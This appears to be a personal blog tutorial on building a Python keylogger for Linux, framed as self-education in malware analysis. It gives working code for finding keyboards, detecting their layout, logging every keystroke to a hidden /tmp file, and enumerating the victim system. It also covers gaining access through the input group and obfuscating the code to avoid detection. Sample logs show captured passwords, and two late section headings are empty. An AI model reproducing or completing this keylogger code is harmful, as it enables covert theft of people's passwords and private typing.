---
title: "Creating a Python Keylogger for Linux Systems"
excerpt: A rough guide on how to build a simple Keylogger for Linux OS, using Python and Bash.
date: 2025-10-05
---

Recently, I've been dabbling a little in malware analysis. Mostly it's quite involved and I only have a basic understanding of some important concepts and tools. So my idea was to start with a more hands-on approach: try to implement some form of malware myself! I came across a video of a very bare-bones Python Windows keylogger and decided I would try the same for Linux systems.

I had a few goals in mind for this project:
- Improve my Python coding skills
- Build a (somewhat) reliable keylogger for Linux systems with either German or English keyboard layouts
- Gain some insight into malware development

> **Note**
> 
> It should be obvious that I will not share the entire source code for my keylogger, as this could easily be abused by adversaries. Instead, I will share only some important snippets to explain the most important syntax and the logic of the program. This project's intention is purely educational.

## 1 Writing the Code

The original motivation for using Python was because of the `evdev` library, which sits at the heart of the logger. In short, this library gives us read access to the raw key/mouse/gamepad input from `/dev/input/`. Altogether, we don't even need to import too many external libraries and modules:
```py
from evdev import InputDevice, list_devices, ecodes
import time
import os
from datetime import datetime
import subprocess
import re
```
I imported `datetime` to fill the logs with additional information later on, and `os` in order to create/edit files on the OS on which the keylogger is executed. The module `subprocess` interacts with the operating system in order to run shell commands and `re` will be used to search and match strings.

The basic logic of the logger is as follows:
1. Find all available keyboards in `/dev/input`
2. Determine the layout of the keyboard(s)
3. Declare a key map for either layout
4. Create a text file into which the characters/keys will be written
5. Write data into text file

### 1.1 Determining the Keyboard Layout

The first step is to find all attached keyboards and finding their layout. Otherwise we might work under the assumption that we are logging an English layout, while in reality it may be German, which would significantly obscure the logs in the end. To my surprise, finding the layouts was not entirely straightforward. I had expected the syntax to be something like
```text
find.os: systemsettings > keyboard > language > English [inactive], German [active]
```
and then we could simply pick the active one. Instead, the the source code for this looks like this:
```py
keyboards = []
for device_path in list_devices():
    try:
        device = InputDevice(device_path)
        caps = device.capabilities()
        if ecodes.EV_KEY in caps:
            key_caps = caps[ecodes.EV_KEY]
            if ecodes.KEY_A in key_caps and ecodes.KEY_SPACE in key_caps:
                keyboards.append(device)
    except:
        continue
if not keyboards:
    exit(1)

def get_keyboard_layout():    
    german_map = { ... }
    us_map = { ... }
    try:
        output = subprocess.check_output(["localectl"], text=True)
        match = re.search(r"X11 Layout:\s*(\S+)", output)
        if match:
            layout = match.group(1).lower()
        else:
            layout = "unknown"
    except (subprocess.CalledProcessError, FileNotFoundError):
        layout = "unknown"
    if layout == "de":
        return "de", german_map
    else:
        return "us", us_map
```
The first part of the snippet does the following:
1. Initialise a list into which all available keyboards are written
2. The loop runs over `/dev/input/event0`, `/dev/input/event1` etc. until a keyboard is found
3. Next, we actually check whether the device *is* a keyboard. To do this, we list the *capabilities* of the device and check whether it can generate key press/release events with `if ecodes.EV_KEY in caps:`.
4. If it can, then we check for common keyboard keys (to make sure the device is not a mouse, for instance) with `if ecodes.KEY_A in key_caps and ecodes.KEY_SPACE in key_caps:`. This is more of a sanity check and we could have chosen different keys here.
5. In this case, the device is classified as a keyboard and is appended to `keyboards`. In most cases, this list will obviously contain only one item.

The second part, i.e. the function `get_keyboard_layout`, determines the language the keyboard is set to. To achieve this, we make use of the terminal command `localectl`, which outputs something like
```console
$ localectl
   System Locale: LANG=de_DE.UTF-8
       VC Keymap: n/a
      X11 Layout: de
       X11 Model: pc105
```
This means that we can extract the X11 Layout with some Python code, which can be seen in the above function. Moreover, I defined two key maps `german_map` and `us_map`, which give a one-to-one mapping between keys and characters. For instance, `german_map` includes `..., 37: 'k', 38: 'l', 39: 'ö',...`. If we want to include further layouts, we should do it in this function. 

These maps also include special keys like `[ENTER]` and `[BACKSPACE]`. This is important for the following reason: say we run the keylogger on the target machine and the victim starts typing their password `Passwd%123` but they accidentally press the `w` key twice. In order to keep track of the real password, we want the output to be `Passww[BACKSPACE]d%123`, and not `Passwwd%123`. Later we could additionally write a script that deletes `[BACKSPACE]` together with the character preceding it.

Another consideration is upper case characters. We could simply make the keylogger output `[SHIFT]a` instead of `A`, but with some additional Python code we can make sure that capitalization is respected.

### 1.2 Writing Characters into a Text File

Now that we have determined the keyboard layout, we still need to write a function which captures the key strokes and appends them to a text file, that we can extract when the logging is done. First of all, we must decide where to store the file. To avoid detection, a keylogger must store its log file in a location that is both hidden from the user and allows the program to write to it without special permissions. A natural candidate for this is the `/tmp` directory. One can go further and create more subdirectories, perhaps mimicking existing ones such as 
```text
systemd-private-f2ba2e3a8d7c44c1b9ab924ca6d3748d-systemd-timesyncd.service-DZPBIs
```
For a simple proof of concept, I decided to write the output into `/tmp/.hidden.txt`, just to add one more layer of detection avoidance. In the code, we simply use the `os` library to create the file:
```py
log_dir = "/tmp/"
log_file = os.path.join(log_dir, ".hidden.txt")

try:
    os.makedirs(log_dir, exist_ok=True)
except Exception as e:
    exit(1)
```
Next, we start writing into the text file. Roughly spreaking, any time a key is pressed, it is printed to `.hidden.txt` together with its timestamp, just for some additional information.
```py
try:
    while True:
        for device in keyboards:
            try:
                event = device.read_one()
                if event and event.type == ecodes.EV_KEY:
                    if event.value == 1:
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        key_char = get_shifted_character(
                            event.code, layout, current_shift, caps_lock, key_map, shifted_maps
                        )
                        if event.code not in MODIFIERS:
                            log_entry = f"{timestamp}:{key_char}"
                            with open(log_file, "a") as f:
                                f.write(log_entry + "\n")
            except BlockingIOError:
                pass
        time.sleep(0.01)
except KeyboardInterrupt:
    exit("\n")
```
The logic is as follows:
1. We use the `while TRUE` loop in order to continuously listen for incoming key presses.
2. We try to read one character (event) at a time.
3. If the event type is classified as being a key, and the key is being pressed (not released), then we get `key_char` using the function `get_shifted_character()`, which returns the exact character, respecting upper/lower case and returning special keys like `[BACKSPACE]` separately.
4. `MODIFIERS` is a list of keys (such as `[L_SHIFT]`, `[R_SHIFT]`,...). If the `event.code` is not in this list, then we are interested in the corresponding character and want to print it to the output.
5. The function `open(log_file, "a")` opens the log file and appends any argument, which is given by `log_entry` in this case.
6. `BlockingIOError` handles any errors if there is no data to be read. We simply ignore this.
7. As a precaution we include a short delay between checks to reduce CPU usage using `time.sleep(0.01)`
8. Finally, we exit the loop gracefully in `except KeyboardInterrupt` using `Ctrl + c`.

Now we can successfully write key strokes to the hidden text file, so we reached our goal. However, I thought it might be worthwile to go a bit further and do some basic enumeration, while we're at it. For instance, it might be nice to gain an understanding of the system that the logger is running on in the first place. I used the following snippet to get things like username, machine name, IP address etc.
```py
def get_system_info():
    info = {}
    try:
        info['username'] = getpass.getuser()
    except:
        info['username'] = 'unknown'
    try:
        info['hostname'] = socket.gethostname()
    except:
        info['hostname'] = 'unknown'
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['ip_address'] = s.getsockname()[0]
        s.close()
    except:
        info['ip_address'] = 'unknown'
    try:
        result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
        info['os_info'] = result.stdout.strip() if result.returncode == 0 else 'unknown'
    except:
        info['os_info'] = 'unknown'
    try:
        info['current_dir'] = subprocess.run(['pwd'], capture_output=True, text=True).stdout.strip()
    except:
        info['current_dir'] = 'unknown'    
    info['startup_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return info
```
This snippet requires some additional libraries, but mostly the code is self-explanatory. Essentially, we run shell commands like `uname -a` and `pwd` in the background and save the respective outputs to a variable. Of course this information is only saved to the log file upon execution of the logger, not after every key stroke.


## 2 Execution

The next step is testing the python program and to fix any bugs, before we start obfuscating the code to hide it as well as possible on the infected machine.

### 2.1 Simple Testing

We simply run `python3 keylogger.py` and type some fake username and password in the browser. The output in `/tmp/.hidden.txt` looks as follows:
```text
============================================================
KEYLOGGER STARTUP SUMMARY
============================================================
Username:       victim
Machine:        victim-machine
IP Address:     10.239.22.148
Startup Time:   2025-10-09 15:45:18
OS Info:        Linux victim-machine 6.7.0-85-generic #85~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 19 16:18:59 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
Current Dir:    /tmp/.secret-folder
Python:         /home/victim/anaconda3/bin/python3
============================================================
LOGGING STARTED
============================================================

2025-10-09 15:45:24:U
2025-10-09 15:45:24:s
2025-10-09 15:45:24:e
2025-10-09 15:45:24:r
2025-10-09 15:45:25:n
2025-10-09 15:45:25:a
2025-10-09 15:45:25:m
2025-10-09 15:45:25:e
2025-10-09 15:45:26:1
2025-10-09 15:45:26:2
2025-10-09 15:45:26:3
2025-10-09 15:45:28:[TAB]
2025-10-09 15:45:34:P
2025-10-09 15:45:34:a
2025-10-09 15:45:34:s
2025-10-09 15:45:34:s
2025-10-09 15:45:39:w
2025-10-09 15:45:41:o
2025-10-09 15:45:42:r
2025-10-09 15:45:43:D
2025-10-09 15:45:46:4
2025-10-09 15:45:46:2
2025-10-09 15:45:48:%
2025-10-09 15:45:49:&
2025-10-09 15:46:25:[ENTER]
```
The keylogger works! The data does not look very pretty, but at least we find a ton of information, including the dummy username `Username123` and password `PassworD42%&`. Through some additional testing I found a few bugs. For instance, the key map `german_map` did not correctly assign the characters `<`, `>` and `#`.

The next test for the keylogger was to run it on a different system. For this, I tried running it on my Kali Linux VM. One problem was that I could not do this a priori, as the `kali` user was not part of the `input` group:
```console
┌──(kali㉿kali)-[/tmp]
└─$ groups $USER                                                    
kali : kali adm dialout cdrom floppy sudo audio dip video plugdev users netdev bluetooth scanner lpadmin wireshark kaboxer docker
```
So in order to start the keylogger, we either have to run `python3 keylogger.py` with `sudo`, or add the user to the input group with the following line:
```console
┌──(kali㉿kali)-[/tmp]
└─$ sudo usermod -a -G input $USER
```
Of course this is a bottleneck if we had malicious intent, but for this PoC we don't care too much. At least now I could run the keylogger smoothly on the Kali VM and view the logs as expected, so good news! 


### 2.2 Simplifying the Output with Bash

Since the content of `.hidden.txt` was not yet nicely readable, I decided to write a short bash script to extract only the logged characters, ignoring the time stamps. The script literally just writes the characters into one long string, while replacing `[SPACE]` with an actual space and while deleting any occurence of `[BACKSPACE]` together with its preceding character. To give an example, what would have originally been saved as
```text
2025-10-09 21:41:46:M
2025-10-09 21:41:47:y
2025-10-09 21:41:47:[SPACE]
2025-10-09 21:41:48:p
2025-10-09 21:41:48:a
2025-10-09 21:41:48:s
2025-10-09 21:41:48:s
2025-10-09 21:41:49:w
2025-10-09 21:41:49:o
2025-10-09 21:41:49:r
2025-10-09 21:41:50:d
2025-10-09 21:41:52:[SPACE]
2025-10-09 21:41:53:i
2025-10-09 21:41:53:s
2025-10-09 21:41:54:[SPACE]
2025-10-09 21:41:57:d
2025-10-09 21:41:58:&
2025-10-09 21:42:02:H
2025-10-09 21:42:05:P
2025-10-09 21:42:11:+
2025-10-09 21:42:21:Z
2025-10-09 21:42:23:[BACKSPACE]
2025-10-09 21:42:24:T
2025-10-09 21:42:30:4
2025-10-09 21:42:30:5
2025-10-09 21:42:35:6
2025-10-09 21:42:36:[BACKSPACE]
2025-10-09 21:42:37:9
2025-10-09 21:42:39:w
2025-10-09 21:42:39:s
2025-10-09 21:42:46:U
2025-10-09 21:42:49:$
```
is now written into a new text file simply as 
```text
My password is d&HP+T459wsU$
```


## 3 Obfuscation and Avoiding Detection

If we wish the keylogger to be harder to reverse-engineer, we necessarily need to obfuscate the code in some way. In practice, this means we should get rid of any spaces, comments and unnecessary syntax, which make the program human-readable.

### 3.1 General Strategies

The first step is to get rid of unnecessary spaces, indentation and we should obscure variable names as much as possible. To give an example, we consider the following snippet, that we looked at earlier, which determines the keyboard layout:
```py
import subprocess
import re

def get_keyboard_layout():    
    german_map = { ... } 
    us_map = { ... }
    try:
        output = subprocess.check_output(["localectl"], text=True)
        match = re.search(r"X11 Layout:\s*(\S+)", output)
        if match:
            layout = match.group(1).lower()
        else:
            layout = "unknown"
    except (subprocess.CalledProcessError, FileNotFoundError):
        layout = "unknown"
    if layout == "de":
        return "de", german_map
    else:
        return "us", us_map

layout, key_map = get_keyboard_layout()
```
After obfuscation, this snippet might look something like this:
```py
import subprocess as edZ92x
import re as ospd8k0004FGtz
def sdc_3dlVK7734xxeiuf978RKv():
    qzo___eofutOU69Igcncd__33333420tt0x0x={ ... }
    _____eeeee0x4D={ ... }
    try:____tz=edZ92x.check_output(["localectl"],text=True);match=ospd8k0004FGtz.search(r"X11 Layout:\s*(\S+)",____tz);sdicIU75__HvkI____=match.group(1).lower()if match else"__U"
    except(edZ92x.CalledProcessError, FileNotFoundError):sdicIU75__HvkI____="aslck12___UUU"
    if sdicIU75__HvkI____=="de":return"de",qzo___eofutOU69Igcncd__33333420tt0x0x
    else:return"kk_kU31117",_____eeeee0x4D
rXN_ttiWe4rr__,x=sdc_3dlVK7734xxeiuf978RKv()
print(rXN_ttiWe4rr__)
```
It's harder to believe, but this code does exactly the same as the human-readable code above.


### 3.2 Hiding the File Path


## 4 Future Improvements







